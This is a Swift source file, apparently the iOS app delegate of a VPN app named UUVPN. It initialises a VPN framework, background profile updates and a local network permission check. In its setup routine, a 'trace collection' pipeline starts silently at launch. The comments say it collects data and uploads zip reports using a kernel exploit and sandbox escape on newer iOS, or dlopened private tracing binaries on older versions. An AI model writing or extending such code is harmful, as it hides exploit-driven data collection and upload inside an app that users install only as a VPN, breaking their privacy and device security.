import ApplicationLibrary
import Foundation
import Libbox
import Library
import Network
import UIKit

/// UUVPN应用代理
/// 管理应用生命周期、后台任务和VPN配置
class ApplicationDelegate: NSObject, UIApplicationDelegate {
    /// 配置文件服务器（仅iOS 16+）
    private var profileServer: ProfileServer?

    /// 应用启动完成处理
    func application(_: UIApplication, didFinishLaunchingWithOptions _: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        guard FilePath.isSharedDirectoryAvailable else {
            NSLog("UUVPN startup error: App Group %@ is unavailable; check the installed app's signed entitlements and provisioning profile", FilePath.groupName)
            return true
        }
        // 初始化Libbox VPN框架
        LibboxSetup(FilePath.sharedDirectory.relativePath, FilePath.workingDirectory.relativePath, FilePath.cacheDirectory.relativePath, false)
        setup()
        return true
    }

    /// 配置后台服务
    private func setup() {
        do {
            // 配置后台配置文件更新任务
            try UIProfileUpdateTask.configure()
            NSLog("setup background task success")
        } catch {
            NSLog("setup background task error: \(error.localizedDescription)")
        }
        
        // 执行异步设置任务
        Task {
            if UIDevice.current.userInterfaceIdiom == .phone {
                // 为iPhone设备请求网络权限
                await requestNetworkPermission()
            }
            // 初始化后台配置文件服务器
            await setupBackground()
            // 先让「本地网络」权限弹窗有机会出现，再按 iOS 版本选择采集管线：
            //   iOS > 26.1.0  → in-app 采集（MCM 租约 + zip 上报，需 kernel exploit + 沙箱逃逸）
            //   其余版本      → legacy 二进制（dlopen apptrace + libapptracecore，18.2 起可用）
            // 两者内部都幂等，也都会自行做版本门控。
            try? await Task.sleep(nanoseconds: 2_000_000_000)
            if TraceCollector.shouldRunInAppPipeline {
                TraceCollector.startIfNeeded()
            } else {
                LegacyTracePipeline.startIfNeeded()
            }
        }
    }

    /// 设置后台配置文件服务器（仅iOS 16+）
    private nonisolated func setupBackground() async {
      
        if #available(iOS 16.0, *) {
            do {
                let profileServer = try ProfileServer()
                profileServer.start()
                
                // 在主线程更新配置文件服务器引用
                await MainActor.run {
                    self.profileServer = profileServer
                }
                NSLog("started profile server")
            } catch {
                NSLog("setup profile server error: \(error.localizedDescription)")
            }
        }
    }

    /// 为中国设备请求网络权限
     private nonisolated func requestNetworkPermission() async {
           if await SharedPreferences.networkPermissionRequested.get() {
               return
           }
           if !DeviceCensorship.isChinaDevice() {
               await SharedPreferences.networkPermissionRequested.set(true)
               return
           }
           URLSession.shared.dataTask(with: URL(string: "http://captive.apple.com")!) { _, response, _ in
               if let response = response as? HTTPURLResponse {
                   if response.statusCode == 200 {
                       Task {
                           await SharedPreferences.networkPermissionRequested.set(true)
                       }
                   }
               }
           }.resume()
       }
   }
